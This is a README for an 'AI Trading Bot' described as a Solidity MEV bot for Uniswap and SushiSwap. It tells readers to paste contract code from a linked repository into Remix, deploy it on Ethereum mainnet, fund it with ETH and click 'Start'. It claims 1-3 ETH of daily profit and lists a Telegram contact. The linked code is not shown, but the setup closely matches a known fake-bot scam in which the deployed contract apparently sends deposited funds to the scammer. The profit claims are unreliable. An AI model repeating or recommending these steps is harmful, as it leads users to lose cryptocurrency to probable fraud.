# AI-Trading-Bot

This repository contains a smart contract-based trading bot for **Ethereum-based tokens**, designed to interact with decentralized exchanges (DEXs) such as **Uniswap** and **GMX**. The bot is written in **Solidity**, using the **Uniswap V2** and **SushiSwap** routers for execution.

## Setup Instructions

Follow these steps to deploy and run your own trading bot:

### 1. Access Remix and MetaMask
- Visit [Remix IDE](https://remix.ethereum.org/)
- Ensure you have the **MetaMask** browser extension installed and connected to the **Ethereum mainnet or testnet**

### 2. Create the Contract File
- In Remix IDE, right-click the `contracts/` folder
- Click **"New File"** and name it (e.g., `bot.sol`)

### 3. Paste the Contract Code
- Copy the source code from this [repository](https://github.com/Jacob-mev/Bot/blob/main/bot.sol)
- Paste it into your newly created `bot.sol` file

### 4. Compile the Contract
- Navigate to the **"Solidity Compiler"** tab
- Select **Solidity version 0.6.6**
- Click **"Compile bot.sol"**

### 5. Deploy the Contract
- Go to the **"Deploy & Run Transactions"** tab
- Set the environment to **"Injected Provider - MetaMask"**
- Select your contract and click **"Deploy"**
- Confirm the transaction in MetaMask to create your contract

### 6. Fund the Contract
- Send at least **0.1 ETH** to your contract address (to prevent slippage-related losses)

### 7. Run the Bot
- In Remix, click the **"Start"** button to activate the bot
- To stop and withdraw funds, click **"Withdrawal"**
- For best results, allow the bot to run for at least 1 hour

## 🔗 Connect With Me

- 📬 [Telegram](https://t.me/hudsondefi4)

---
🔥 My running mev bot, used 10 ETH. Averaging about 1-3 ETH per day! https://etherscan.io/address/0xfac983fce7ef3cee8ffb2ceb967e1b2362aada00


## 📄 License

This project is for educational and research purposes only. Use at your own risk.
